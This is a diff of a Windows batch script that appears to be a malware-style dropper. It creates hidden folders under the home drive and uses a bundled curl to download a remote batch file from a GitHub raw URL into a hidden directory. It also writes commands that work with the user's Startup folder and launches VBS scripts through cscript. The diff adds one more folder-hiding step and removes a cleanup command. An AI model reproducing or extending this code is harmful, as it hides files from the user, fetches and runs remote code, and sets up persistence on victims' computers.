@@ -2,6 +2,7 @@
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 attrib +h %homedrive%\curl
+attrib +h %homedrive%\A7uma
 mkdir %homedrive%\ShiniGami
 attrib +h %homedrive%\ShiniGami
 %homedrive%\curl\bin\curl.exe -L https://raw.githubusercontent.com/l-urk/Akuma/main/A7uma.bat > %homedrive%\ShiniGami\A7uma.bat
@@ -19,7 +20,6 @@ echo start %homedrive%\Akuma\死神.vbs >> %homedrive%\Akuma\beyondbirthday.bat
 echo cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" >> %homedrive%\Akuma\beyondbirthday.bat
 echo del "beyondbirthday.lnk" >> %homedrive%\Akuma\beyondbirthday.bat
 set "vbsFilePath=%homedrive%\Akuma\beyondbirthday.vbs"
-rmdir /s /q %homedrive%\A7uma
 IF EXIST "%vbsFilePath%" (
     cscript "%vbsFilePath%"
 ) ELSE (
